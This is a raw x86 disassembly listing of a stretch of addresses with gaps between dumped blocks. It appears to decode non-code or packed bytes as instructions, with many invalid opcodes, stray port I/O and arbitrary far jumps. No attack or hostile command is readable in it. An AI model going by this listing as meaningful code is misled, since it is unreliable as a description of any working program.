  426eb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426eb7:	lock mov DWORD PTR [edi],ebp
  426eba:	pop    edi
  426ebb:	jae    0x426ecf
  426ebd:	loop   0x426f1a
  426ebf:	js     0x426ec3
  426ec1:	mov    dl,0xb4
  426ec3:	xchg   DWORD PTR [ecx+0x1c],edx
  426ec6:	pop    esp
  426ec7:	sub    dh,BYTE PTR [edi+eiz*1-0x77]
  426ecb:	push   ebx
  426ecc:	xchg   edx,eax
  426ecd:	int3   
  426ece:	cmp    BYTE PTR [ebx-0x2147fa6b],al
  426ed4:	call   0x3ee9b4be
  426ed9:	ror    DWORD PTR [ebx-0x57967e84],cl
  426edf:	and    ch,BYTE PTR [edi-0x290d79ac]
  426ee5:	shr    DWORD PTR [eax+0x45],cl
  426ee8:	lahf   
  426ee9:	pop    edx
  426eea:	sbb    eax,0x3b82286f
  426eef:	int    0x68
  426ef1:	aaa    
  426ef2:	pop    ebp
  426ef3:	cmp    ecx,DWORD PTR [eax-0x28861e8f]
  426ef9:	call   0x2e3b:0x258c84d4
  426f00:	mov    cl,0xc0
  426f02:	int3   
  426f03:	ret    0xfc5f
  426f06:	dec    esi
  426f07:	ror    DWORD PTR [esi],0x74
  426f0a:	adc    al,0x68
  426f0c:	aas    
  426f0d:	shl    BYTE PTR ds:0xa4,0x0
	...
  426f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f75:	mov    ds:0xf5c7f1c7,al
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [ebx+edi*1+0x866db3b],esp
  426f85:	mov    al,ds:0x1040001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f8d:	xchg   esp,eax
  426f8e:	pop    ebx
  426f8f:	arpl   WORD PTR ds:0x36d4c6e2,si
  426f95:	cs (bad) 
  426f97:	pop    ds
  426f98:	shl    BYTE PTR [ecx],1
  426f9a:	and    BYTE PTR [edx],0x29
  426f9d:	adc    eax,edx
  426f9f:	clc    
  426fa0:	xor    ah,BYTE PTR [ebx+0x1866dbdb]
  426fa6:	sbb    eax,0xc07650dd
  426fab:	lea    ebp,[ebx]
  426fad:	iret   
  426fae:	dec    edi
  426faf:	fwait
  426fb0:	cmp    al,0xbb
  426fb2:	inc    edi
  426fb3:	push   ss
  426fb4:	iret   
  426fb5:	mov    esp,edx
  426fb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426fb8:	je     0x427034
  426fba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fbb:	mov    al,ds:0x3327e0d9
  426fc1:	out    0xe2,al
  426fc3:	mov    dl,0x87
  426fc5:	jnp    0x427040
  426fc7:	sbb    al,al
  426fc9:	mov    ebx,0xeb6f824a
  426fce:	push   eax
  426fcf:	inc    ebx
  426fd0:	cmp    eax,eax
  426fd2:	fild   QWORD PTR [esi+0x27]
  426fd5:	jg     0x426fde
  426fd7:	mov    edi,0x14c318c4
  426fdc:	js     0x426f74
  426fde:	push   0x8c77d04a
  426fe3:	lahf   
  426fe4:	cmp    BYTE PTR [edx-0x78],dl
  426fe7:	cs xchg edx,eax
  426fea:	adc    eax,0xb7c0f073
  426fef:	out    0x31,al
  426ff1:	push   ebx
  426ff2:	call   0x17aac305
  426ff7:	int    0xa8
  426ff9:	outs   dx,DWORD PTR ds:[esi]
  426ffa:	retf   0x7968
  426ffd:	test   DWORD PTR [edi],ebp
  426fff:	test   DWORD PTR [ebp-0x66],ebx
  427002:	jmp    0x426fbb
  427004:	jno    0x42702e
  427006:	mov    esp,0x9cf2441c
  42700b:	sub    edi,edi
  42700d:	jbe    0x427084
  42700f:	or     DWORD PTR [eax+0x4afcfb99],eax
  427015:	lea    esp,[ecx-0x15b7d52a]
  42701b:	pop    ds
  42701c:	jmp    0x427091
  42701e:	sbb    eax,0xeb6bf351
  427023:	inc    ecx
  427024:	dec    edx
  427025:	sub    al,0xe2
  427027:	and    bh,BYTE PTR [edx-0x5e]
  42702a:	(bad)  
  42702b:	in     eax,0xcd
  42702d:	push   ebx
  42702e:	or     DWORD PTR [edi],edi
  427030:	jnp    0x4270aa
  427032:	mov    dl,0xfe
  427034:	lods   al,BYTE PTR ds:[esi]
  427035:	xor    dl,BYTE PTR [eax+0x33900147]
  42703b:	cmc    
  42703c:	mov    eax,0x9255c206
  427041:	or     al,0x79
  427043:	sti    
  427044:	clc    
  427045:	arpl   WORD PTR [ebp-0x41],di
  427048:	or     ecx,DWORD PTR [ebp-0x6f]
  42704b:	aas    
  42704c:	dec    edi
  42704d:	es in  ax,0xcc
  427051:	inc    eax
  427052:	test   eax,0x3eb699a0
  427057:	push   edx
  427058:	nop
  427059:	sub    ecx,ebp
  42705b:	pop    eax
  42705c:	push   ebp
  42705d:	ret    
  42705e:	je     0x4270d2
  427060:	xchg   DWORD PTR [esi+0x70],edx
  427063:	mov    ebx,0xae5cecb4
  427068:	xchg   esi,eax
  427069:	sbb    eax,0x7ba9a58c
  42706e:	sub    edi,0x21507856
  427074:	sub    al,0x28
  427076:	xchg   esi,eax
  427077:	mov    dh,0xe
  427079:	and    eax,0xc9e957c4
  42707e:	sbb    BYTE PTR [edx],0xc3
  427081:	or     BYTE PTR cs:0x391dde35,ah
  427088:	out    0xd4,eax
  42708a:	mov    bl,0x8
  42708c:	fisttp WORD PTR [esi]
  42708e:	aaa    
  42708f:	jmp    0x427094
	...
  4270f4:	or     al,0x6d
  4270f6:	sbb    dl,BYTE PTR [ebp-0x2700885]
  4270fc:	inc    esp
  4270fd:	mov    ebp,0xe1189d96
  427102:	jle    0x441214
  427108:	add    al,0x1
  42710a:	add    BYTE PTR [eax],al
  42710c:	pop    ebx
  42710d:	inc    eax
  42710e:	jecxz  0x4270a8
  427110:	clc    
  427111:	daa    
  427112:	fwait
  427113:	mov    bh,0x87
  427115:	sub    al,0x25
  427117:	or     BYTE PTR [ebp-0x25d1a05c],dh
  42711d:	push   0xffffffd3
  42711f:	adc    al,0x9f
  427121:	cmp    al,0x7b
  427123:	retf   0x589d
  427126:	mov    esi,0x968a1ced
  42712b:	mov    dl,0x69
  42712d:	std    
  42712e:	inc    esi
  42712f:	mov    bh,0xaf
  427131:	shl    BYTE PTR [eax],cl
  427133:	ror    esp,1
  427135:	sar    BYTE PTR [edx+0x28],0x4
  427139:	xor    DWORD PTR [edi-0x5b093cac],ecx
  42713f:	fdivr  QWORD PTR [ebp+ebx*2+0x24]
  427143:	or     al,0xba
  427145:	inc    ebx
  427146:	imul   ecx,DWORD PTR [eax-0x1264cfe6],0xff813099
  427150:	mov    ch,BYTE PTR [edx]
  427152:	mov    ch,0x4a
  427154:	ins    DWORD PTR es:[edi],dx
  427155:	ror    BYTE PTR [ebp+0x20],1
  427158:	xchg   edx,ebp
  42715a:	call   0x7f42c28
  42715f:	jne    0x427131
  427161:	inc    ebx
  427162:	cmp    al,0x10
  427164:	dec    esi
  427165:	xor    bh,al
  427167:	and    DWORD PTR [ecx],esi
  427169:	or     al,0x36
  42716b:	call   0xc47c:0xb2767035
  427172:	mov    esi,0x36a27371
  427177:	sbb    DWORD PTR [ecx],edx
  427179:	mov    esp,0x9999bbf7
  42717e:	xchg   ebp,ebp
  427180:	mov    ch,0x66
  427182:	(bad)  
  427183:	shl    BYTE PTR [edi],0x30
  427186:	cmp    al,0x1f
  427188:	ins    DWORD PTR es:[edi],dx
  427189:	int3   
  42718a:	mov    esi,0x4e2f9e8a
  42718f:	nop
  427190:	jg     0x427194
  427192:	sbb    al,0x83
  427194:	xlat   BYTE PTR ds:[ebx]
  427195:	or     ecx,DWORD PTR [eax+0x3b]
  427198:	or     BYTE PTR [esi],cl
  42719a:	mov    ss,WORD PTR [edx-0x7e]
  42719d:	je     0x427212
  42719f:	inc    ebp
  4271a0:	into   
  4271a1:	mov    dl,0x51
  4271a3:	jmp    0x7998:0x500c79fc
  4271aa:	loopne 0x427192
  4271ac:	leave  
  4271ad:	dec    ebp
  4271ae:	mov    ds:0x8d9dce0e,eax
  4271b3:	imul   esp,DWORD PTR [edi],0x1ab45972
  4271b9:	nop
  4271ba:	cld    
  4271bb:	enter  0x5f83,0x7f
  4271bf:	inc    esi
  4271c0:	xor    dl,BYTE PTR [edi-0x5a]
  4271c3:	into   
  4271c4:	ja     0x42722a
  4271c6:	jecxz  0x427193
  4271c8:	rol    dl,1
  4271ca:	sbb    al,0xca
  4271cc:	repnz daa 
  4271ce:	mov    dl,0xfa
  4271d0:	jle    0x42724a
  4271d2:	arpl   si,dx
  4271d4:	push   eax
  4271d5:	mov    cl,0x9a
  4271d7:	mov    bl,0xa2
  4271d9:	outs   dx,BYTE PTR ds:[esi]
  4271da:	jecxz  0x427239
  4271dc:	mov    bl,0x43
  4271de:	sbb    eax,0xff5fa3e
  4271e3:	xor    BYTE PTR [esi+0x48],ah
  4271e6:	ds loop 0x427207
  4271e9:	sar    edx,0xc2
  4271ec:	or     BYTE PTR [bx+si-0x34],cl
  4271f0:	jmp    0x74d9f152
  4271f5:	je     0x4271c8
  4271f7:	mov    WORD PTR [esi-0x50],ss
  4271fa:	outs   dx,DWORD PTR ds:[esi]
  4271fb:	jns    0x427210
  4271fd:	sahf   
  4271fe:	and    esp,DWORD PTR [eax-0x22]
  427201:	push   ebx
  427202:	push   esp
  427203:	sbb    edx,edx
  427205:	add    bh,bh
  427207:	popa   
  427208:	lock mov bh,0x9a
  42720b:	test   eax,0xc7af1bb5
	...
  427274:	push   ds
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0x5099d541,al
  427284:	adc    BYTE PTR [edx+0x1040001],ah
  42728a:	add    BYTE PTR [eax],al
  42728c:	mov    al,ds:0x1faee718
  427291:	sbb    al,0x30
  427293:	test   BYTE PTR fs:[esi-0x5c],al
  427297:	push   ss
  427298:	(bad)  
  427299:	mov    esp,DWORD PTR ds:0xaa3bb631
  42729f:	rol    cl,0x3c
  4272a2:	xor    DWORD PTR [ecx+0x6a7326b6],0xffffffb5
  4272a9:	gs dec ebp
  4272ab:	retf   
  4272ac:	sbb    dl,0xbd
  4272af:	or     eax,0xac3e8b39
  4272b4:	and    ebp,DWORD PTR [edx-0x26]
  4272b7:	jmp    0x4272de
  4272b9:	sbb    ecx,0xffffffbd
  4272bc:	imul   ebx,DWORD PTR [ecx],0x6e
  4272bf:	dec    esi
  4272c0:	outs   dx,BYTE PTR ds:[esi]
  4272c1:	cmp    BYTE PTR [ebp+0xca3b7c1],ch
  4272c7:	ins    DWORD PTR es:[edi],dx
  4272c8:	dec    esp
  4272c9:	push   ds
  4272ca:	es push 0xee9fd3fd
  4272d0:	sbb    BYTE PTR [eax],0xd
  4272d3:	fdiv   DWORD PTR [ecx+0x6f3dee54]
  4272d9:	push   0xffffffdb
  4272db:	cmp    DWORD PTR [edx-0x301cad5a],esi
  4272e1:	std    
  4272e2:	xor    dl,BYTE PTR [esp+ebp*1-0x2e]
  4272e6:	add    BYTE PTR [eax+edx*8-0x2d],bl
  4272ea:	retf   0xcba1
  4272ed:	fidivr DWORD PTR [ecx]
  4272ef:	(bad)  
  4272f0:	jae    0x4272fe
  4272f2:	int    0x67
  4272f4:	xor    DWORD PTR [edx-0x29],0xffffff84
  4272f8:	mov    ds:0x1efe8b64,eax
  4272fd:	int3   
  4272fe:	inc    eax
  4272ff:	es ins DWORD PTR es:[edi],dx
  427301:	xchg   esp,eax
  427302:	sbb    DWORD PTR [ecx+0x53],ebx
  427305:	dec    ebx
  427306:	mov    edx,0xa9d2a731
  42730b:	jbe    0x427380
  42730d:	scas   al,BYTE PTR es:[edi]
  42730e:	cwde   
  42730f:	dec    ebp
  427310:	add    al,0x40
  427312:	adc    eax,ebx
  427314:	out    dx,eax
  427315:	pop    ds
  427316:	mov    ah,0x4a
  427318:	xchg   DWORD PTR [ebx],esi
  42731a:	stc    
  42731b:	fdivr  DWORD PTR [ebx+0x6d]
  42731e:	jecxz  0x427354
  427320:	pop    esp
  427321:	retf   0x6f0d
  427324:	inc    esi
  427325:	pop    eax
  427326:	fst    DWORD PTR [ebp+0xc561b7f]
  42732c:	shl    BYTE PTR [ebp+0x21],cl
  42732f:	test   DWORD PTR [esi+0x5b2206d8],ebx
  427335:	(bad)  
  427337:	sbb    ch,al
  427339:	or     eax,0xc626988c
  42733e:	out    dx,eax
  42733f:	(bad)  
  427340:	push   ss
  427341:	lahf   
  427342:	mov    ebx,0xb1609af8
  427347:	lods   al,BYTE PTR ds:[esi]
  427348:	dec    edx
  427349:	inc    ebx
  42734b:	and    ebx,DWORD PTR [esi]
  42734d:	mov    dh,0x10
  427350:	out    dx,eax
  427351:	pop    ss
  427352:	xchg   ebx,eax
  427353:	mov    ebp,0xc0bc0a7f
  427358:	push   ebx
  427359:	and    BYTE PTR [edx+0x1d3ec80d],0xcd
  427360:	repz aas 
  427362:	add    al,BYTE PTR [esi+0x421c8a0]
  427368:	(bad)  
  427369:	aaa    
  42736a:	xchg   esp,eax
  42736b:	call   0x62d2:0x401e7376
  427372:	mov    al,0xe2
  427374:	pop    eax
  427375:	rol    BYTE PTR [esi],0xf8
  427378:	xchg   ebp,eax
  427379:	pop    esp
  42737a:	inc    edx
  42737b:	retf   0x819c
  42737e:	xor    eax,0xb38d0bc5
  427383:	mov    ebx,0x6c63b78f
  427388:	xchg   ebp,eax
  427389:	popa   
  42738a:	xor    bl,BYTE PTR ds:0xffbd1649
	...
  4273f4:	adc    bl,BYTE PTR ds:0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    esp,DWORD PTR [esi+0x1492a004]
  427405:	mov    ds:0x1040001,eax
  42740a:	add    BYTE PTR [eax],al
  42740c:	jns    0x4273c7
  42740e:	into   
  42740f:	shr    BYTE PTR [esi-0xe3dac32],cl
  427415:	adc    al,0xb0
  427417:	and    ebp,DWORD PTR [edi+edi*8-0x773d8d51]
  42741e:	leave  
  42741f:	mov    ah,0xa8
  427421:	sbb    dl,cl
  427423:	or     al,0x29
  427425:	sbb    DWORD PTR [eax-0x33fd57e7],edi
  42742b:	test   BYTE PTR [edx],ch
  42742d:	imul   ebx,DWORD PTR [edi],0x4c79ea3e
  427433:	int    0xf3
  427435:	adc    eax,0xe2f04c3
  42743a:	sub    eax,0x376e6446
  42743f:	clc    
  427440:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427441:	cmp    DWORD PTR [ebx],esi
  427443:	push   esp
  427444:	in     al,dx
  427445:	imul   edx,DWORD PTR [edi+0x68],0xcb82ea65
  42744c:	xor    ebx,ecx
  42744e:	mov    eax,0x537c8dae
  427453:	jmp    0x6386:0x7c0efb0b
  42745a:	jnp    0x4274b1
  42745c:	or     DWORD PTR [ebp+esi*2+0x7a],edi
  427460:	in     al,0xa4
  427462:	mov    ch,0x63
  427464:	shr    DWORD PTR [ecx-0xcc5292c],1
  42746a:	mov    ah,0x5c
  42746c:	sbb    al,bl
  42746e:	or     DWORD PTR [edx+eiz*4],eax
  427471:	cmc    
  427472:	add    BYTE PTR [ebx-0x4d],ch
  427475:	imul   ebp,DWORD PTR [esi+0x93cf020],0xd23a0049
  42747f:	add    ch,BYTE PTR [ecx-0x6db01874]
  427485:	sbb    BYTE PTR [ecx],bl
  427487:	mov    edi,0x2703332f
  42748c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42748d:	push   0xd0a9a8bc
  427492:	xor    ebx,DWORD PTR [edi-0x11]
  427495:	or     al,0xf1
  427497:	jbe    0x42742e
  427499:	jmp    0xdb108850
  42749e:	mov    ebx,DWORD PTR [ecx-0x29]
  4274a1:	popf   
  4274a2:	out    dx,al
  4274a3:	add    ebp,DWORD PTR [eax]
  4274a5:	fs lahf 
  4274a7:	ins    BYTE PTR es:[edi],dx
  4274a8:	ret    
  4274a9:	push   ss
  4274aa:	cmp    BYTE PTR [ebx+0x4bc2191b],ah
  4274b0:	mov    al,0xf1
  4274b2:	sbb    DWORD PTR [eax],0x4cfab52e
  4274b8:	(bad)  
  4274b9:	or     eax,0xd30d0a2e
  4274be:	cmp    eax,0xe45121d1
  4274c3:	jno    0x4274e4
  4274c5:	ds ror ecx,cl
  4274c8:	sbb    esi,edi
  4274ca:	data16 cmp bh,ch
  4274cd:	xchg   edi,eax
  4274ce:	rcr    BYTE PTR [ecx+0x8],1
  4274d1:	test   al,0x3c
  4274d3:	push   ds
  4274d4:	push   edx
  4274d5:	add    cl,BYTE PTR ds:0xb9cb0ead
  4274db:	pusha  
  4274dc:	ins    BYTE PTR es:[edi],dx
  4274dd:	adc    eax,0x7474f2d6
  4274e2:	jae    0x427534
  4274e4:	add    ah,cl
  4274e6:	jecxz  0x42749b
  4274e8:	cwde   
  4274e9:	push   ebp
  4274ea:	mov    ebx,0xe0207d0c
  4274ef:	jmp    0x427512
  4274f1:	fsubp  st(3),st
  4274f3:	xor    eax,DWORD PTR [edx-0x37]
  4274f6:	and    bh,BYTE PTR [edx-0x68a843b0]
  4274fc:	cmp    cl,ah
  4274fe:	fbld   TBYTE PTR [eax+0x205f1257]
  427504:	xor    al,0x15
  427506:	or     al,0x2c
  427508:	or     BYTE PTR [edx+esi*4+0x195f7ca6],cl
  42750f:	push   cs
	...
  427574:	pop    esp
  427575:	test   al,0xc0
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	push   0x189ea391
  427585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427586:	add    DWORD PTR [eax],eax
  427588:	add    al,0x1
  42758a:	add    BYTE PTR [eax],al
  42758c:	or     DWORD PTR [esi],0x259668ef
  427592:	frstor [ecx+0x72051831]
  427598:	daa    
  427599:	xchg   edx,eax
  42759a:	mov    eax,DWORD PTR [eax+0x5d]
  42759d:	stc    
  42759e:	dec    edx
  42759f:	sbb    BYTE PTR [ebx-0x6d],ch
  4275a2:	call   0x6af8:0x6887285e
  4275a9:	pop    ds
  4275aa:	push   eax
  4275ab:	mov    esp,0xd37d7ff2
  4275b0:	bound  eax,QWORD PTR [eax-0x3f]
  4275b3:	pushf  
  4275b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275b5:	loopne 0x4275b0
  4275b7:	or     BYTE PTR [eax-0x13],cl
  4275ba:	ret    
  4275bb:	push   es
  4275bc:	pop    ebx
  4275bd:	cmp    ebx,DWORD PTR [ebx]
  4275bf:	stos   DWORD PTR es:[edi],eax
  4275c0:	jbe    0x4275bf
  4275c2:	pop    eax
  4275c3:	int    0xe4
  4275c5:	fdiv   DWORD PTR [edi]
  4275c7:	jmp    0x4275bf
  4275c9:	inc    esi
  4275ca:	mov    al,0xc7
  4275cc:	cmp    eax,0xa6a92c47
  4275d1:	xchg   ecx,eax
  4275d2:	addr16 mov cl,0x67
  4275d5:	pusha  
  4275d6:	psllq  mm6,QWORD PTR [esi+0x21e3dd94]
  4275dd:	out    dx,eax
  4275de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4275df:	xor    BYTE PTR [ebx-0x67],ch
  4275e2:	inc    edx
  4275e3:	dec    ebx
  4275e4:	dec    ebp
  4275e5:	xchg   edx,eax
  4275e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275e7:	xchg   edi,eax
  4275e8:	mov    ebp,DWORD PTR [eax]
  4275ea:	dec    ebx
  4275eb:	out    dx,al
  4275ec:	push   ds
  4275ed:	push   ebp
  4275ee:	xor    eax,0x2c66e104
  4275f3:	or     cl,BYTE PTR [esi]
  4275f5:	out    0x61,eax
  4275f7:	or     BYTE PTR [esi+0x418979e],cl
  4275fd:	imul   ebp,DWORD PTR [eax],0xcb4d0f7c
  427603:	fcom   DWORD PTR cs:[eax+0x4]
  427607:	jmp    0xde07:0xefd8a855
  42760e:	or     eax,eax
  427610:	std    
  427611:	je     0x427649
  427613:	push   edx
  427614:	inc    BYTE PTR [eax]
  427616:	sub    eax,0xb96cbd4c
  42761b:	scas   al,BYTE PTR es:[edi]
  42761c:	pop    ds
  42761d:	and    ch,cl
  42761f:	mov    edi,0x57e5b7a4
  427624:	and    al,0xc
  427626:	sub    ch,BYTE PTR [ebp+ebx*2+0x4fdf87c0]
  42762d:	fcomi  st,st(2)
  42762f:	adc    edx,0x4f
  427632:	dec    eax
  427633:	iret   
  427634:	xchg   edx,eax
  427635:	ror    BYTE PTR [edx-0x79],cl
  427638:	cmp    eax,0xbb256640
  42763d:	mov    bl,0x70
  42763f:	shl    BYTE PTR [edi+0x26],0x90
  427643:	rol    BYTE PTR ds:[edx+edx*8-0x31],1
  427648:	mov    esp,0xf0c49baa
  42764d:	adc    bh,BYTE PTR [eax+0x70ae999f]
  427653:	cmc    
  427654:	popf   
  427655:	cmc    
  427656:	je     0x427653
  427658:	push   cs
  427659:	xor    eax,0x94e0ac63
  42765e:	arpl   WORD PTR [esi+0x136bb221],di
  427664:	xchg   cl,bl
  427666:	adc    edx,DWORD PTR [eax+0x17]
  427669:	xchg   ebp,eax
  42766a:	and    eax,0x1f8be9b
  42766f:	pop    ebx
  427670:	dec    esp
  427671:	adc    BYTE PTR cs:[edx+ebp*8],cl
  427675:	leave  
  427676:	repz inc edi
  427678:	out    dx,eax
  427679:	leave  
  42767a:	mov    bh,0xf9
  42767c:	cmp    al,BYTE PTR [edi+0x135d67ce]
  427682:	imul   esi,DWORD PTR [edx+0x1a],0xffffffac
  427686:	arpl   WORD PTR [edi],cx
  427688:	pop    ds
  427689:	out    0xb4,al
  42768b:	and    eax,0x77f7a43e
	...
  4276f4:	add    DWORD PTR [esi-0x70],edx
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fldenv [esi-0x2c]
  427702:	arpl   WORD PTR [eax+0x1c],cx
  427705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427706:	add    DWORD PTR [eax],eax
  427708:	add    al,0x1
  42770a:	add    BYTE PTR [eax],al
  42770c:	(bad)  
  42770d:	test   ebp,ecx
  42770f:	mov    ebx,0x8d835b47
  427714:	rcr    BYTE PTR [edx-0x40c9efe8],1
  42771a:	lahf   
  42771b:	sub    dh,bl
  42771d:	retf   
  42771e:	out    0x6e,al
  427720:	imul   eax,ebx,0xffffffd0
  427723:	nop
  427724:	jecxz  0x4276a8
  427726:	out    dx,al
  427727:	inc    esi
  427728:	inc    esp
  427729:	ins    DWORD PTR es:[edi],dx
  42772a:	ins    DWORD PTR es:[edi],dx
  42772b:	pop    es
  42772c:	push   ecx
  42772d:	push   es
  42772e:	add    ah,BYTE PTR [esi+0x77]
  427731:	mov    esp,0x21365c8c
  427736:	sbb    dl,BYTE PTR [ebx-0x67]
  427739:	adc    eax,0xa08e14d3
  42773e:	or     eax,0xecaf8e97
  427743:	cmc    
  427744:	xchg   DWORD PTR [eax+0x3bd67e85],esp
  42774a:	sub    al,0xaa
  42774c:	pop    ebx
  42774d:	cmp    eax,0xa1a2e9f8
  427752:	(bad)  
  427754:	aad    0x85
  427756:	cs fistp DWORD PTR ds:[ebx+0x25e43e8]
  42775e:	fbld   TBYTE PTR [ebx+0x4a]
  427761:	test   BYTE PTR ds:0x884491e0,al
  427767:	mov    esi,0xd4aafe9a
  42776c:	cmc    
  42776d:	cmp    al,BYTE PTR [ebp+0x74c19be7]
  427773:	sbb    cl,bl
  427775:	dec    esi
  427776:	sub    bh,BYTE PTR [edx]
  427778:	(bad)  
  427779:	daa    
  42777a:	fisub  WORD PTR [esi-0x43]
  42777d:	es lahf 
  42777f:	cmp    edi,ebx
  427781:	dec    ebp
  427782:	dec    esi
  427783:	push   ebp
  427784:	inc    esp
  427785:	jp     0x427785
  427787:	or     ecx,esp
  427789:	stc    
  42778a:	and    al,0x2b
  42778c:	add    dl,dl
  42778e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42778f:	push   edi
  427790:	bound  esi,QWORD PTR [ecx]
  427792:	pop    es
  427793:	(bad)  
  427795:	jmp    0xaaa3da26
  42779a:	scas   eax,DWORD PTR es:[edi]
  42779b:	jne    0x4277b3
  42779d:	test   ebx,edi
  42779f:	mov    ah,0xe4
  4277a1:	pop    ds
  4277a2:	mov    bh,0xd5
  4277a4:	popa   
  4277a5:	jmp    0xfdbf612
  4277aa:	xchg   edi,eax
  4277ab:	addr16 ret 
  4277ad:	lahf   
  4277ae:	inc    eax
  4277af:	sbb    eax,DWORD PTR [ebx+esi*8-0x7113579c]
  4277b6:	mov    bl,0x7f
  4277b8:	mov    BYTE PTR [esi-0x59],0xc0
  4277bc:	out    dx,al
  4277bd:	pop    edi
  4277be:	outs   dx,DWORD PTR ds:[esi]
  4277bf:	cli    
  4277c0:	mov    ah,BYTE PTR [ebx-0x58]
  4277c3:	in     al,0xe2
  4277c5:	xchg   ebp,eax
  4277c6:	jmp    0x3743f472
  4277cb:	lods   eax,DWORD PTR ds:[esi]
  4277cc:	sub    BYTE PTR [ebp+0x2e7dfd7a],0xff
  4277d3:	bound  ebp,QWORD PTR [edi-0x15]
  4277d6:	sub    eax,0xa60ba1bb
  4277db:	adc    BYTE PTR [ebx],dh
  4277dd:	add    ebp,esi
  4277df:	in     eax,dx
  4277e0:	dec    esi
  4277e1:	enter  0x9619,0xa3
  4277e5:	adc    eax,0x868f9b85
  4277ea:	shl    BYTE PTR [ecx+0x68],cl
  4277ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277ee:	lods   al,BYTE PTR ds:[esi]
  4277ef:	mov    ds:0x5711b885,eax
  4277f4:	out    0x74,al
  4277f6:	ret    0x8707
  4277f9:	xchg   ebp,eax
  4277fa:	add    DWORD PTR [ebx+esi*8-0x6b7cb795],ebp
  427801:	mov    al,ds:0x6538e6e2
  427806:	in     eax,0x5c
  427808:	pop    esi
  427809:	jae    0x4277dd
  42780b:	out    0x75,al
  42780d:	push   edx
  42780e:	mov    cl,0xb2
	...
  427874:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  42787a:	pop    esi
  42787b:	fbstp  TBYTE PTR [eax+0x65]
  42787e:	fldl2e 
  427880:	cwde   
  427881:	outs   dx,BYTE PTR ds:[esi]
  427882:	ss ins DWORD PTR es:[edi],dx
  427884:	and    BYTE PTR [esi+0x1040001],ah
  42788a:	add    BYTE PTR [eax],al
  42788c:	and    bh,al
  42788e:	pop    ecx
  42788f:	pop    ecx
  427890:	test   eax,0x5e57dee
  427895:	call   0x136cae67
  42789a:	sub    dh,BYTE PTR [edi]
  42789c:	sbb    DWORD PTR [ebx-0x2f],edx
  42789f:	icebp  
  4278a0:	pop    es
  4278a1:	pop    ecx
  4278a2:	adc    eax,ecx
  4278a4:	aaa    
  4278a5:	jp     0x42787f
  4278a7:	pop    ss
  4278a8:	ja     0x427923
  4278aa:	inc    ebp
  4278ab:	adc    ah,BYTE PTR [edx-0x33]
  4278ae:	mov    gs,WORD PTR [ecx-0x6c]
  4278b1:	xor    al,0x41
  4278b3:	cwde   
  4278b4:	and    al,0xb5
  4278b6:	cli    
  4278b7:	out    0xc1,eax
  4278b9:	loopne 0x4278e8
  4278bb:	add    BYTE PTR [edx+0x73c0a7eb],bl
  4278c1:	and    eax,0x7aee5245
  4278c6:	add    DWORD PTR [eax],eax
  4278c8:	or     eax,0x745dd6ba
  4278cd:	test   cl,ah
  4278cf:	add    eax,0x31366c81
  4278d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278d5:	data16 loopne 0x427919
  4278d8:	stos   DWORD PTR es:[edi],eax
  4278d9:	or     DWORD PTR [esi-0x4b2b6fe1],ecx
  4278df:	inc    edx
  4278e0:	scas   eax,DWORD PTR es:[edi]
  4278e1:	push   esi
  4278e2:	sbb    DWORD PTR [ecx-0x56],eax
  4278e5:	cs jl  0x427888
  4278e8:	mov    ds:0x52cb4af8,al
  4278ed:	xchg   esp,eax
  4278ee:	fwait
  4278ef:	stos   BYTE PTR es:[edi],al
  4278f0:	xchg   edi,eax
  4278f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4278f2:	and    dh,dh
  4278f4:	adc    BYTE PTR [edx-0x52696977],al
  4278fa:	jg     0x4278e3
  4278fc:	push   cs
  4278fd:	stos   BYTE PTR es:[edi],al
  4278fe:	pusha  
  4278ff:	xor    dl,BYTE PTR [eax+0x37f4494f]
  427905:	sub    eax,0x51f96204
  42790a:	cmp    DWORD PTR [ecx-0xa],0x4b
  42790e:	fcmovne st,st(4)
  427910:	mov    edx,0xd5d67341
  427915:	cmp    al,0x10
  427917:	(bad)  
  427918:	jle    0x4278e6
  42791a:	ins    DWORD PTR es:[edi],dx
  42791b:	push   esi
  42791c:	repz bound edi,QWORD PTR fs:[esi]
  427920:	jae    0x427908
  427922:	and    BYTE PTR [eax],dl
  427924:	ds inc edx
  427926:	dec    esi
  427927:	mov    bl,0x53
  427929:	push   0x5
  42792b:	in     al,0x12
  42792d:	mov    ds:0xbd262f35,al
  427932:	scas   eax,DWORD PTR es:[edi]
  427933:	(bad)  
  427934:	dec    BYTE PTR [ebp+0x4b]
  427937:	add    DWORD PTR [edx],0xffffffde
  42793a:	sub    bh,ah
  42793c:	pop    ecx
  42793d:	out    dx,al
  42793e:	nop
  42793f:	shl    BYTE PTR [esi-0x4b],cl
  427942:	mov    esp,0x80176c1f
  427947:	leave  
  427948:	addr16 (bad) 
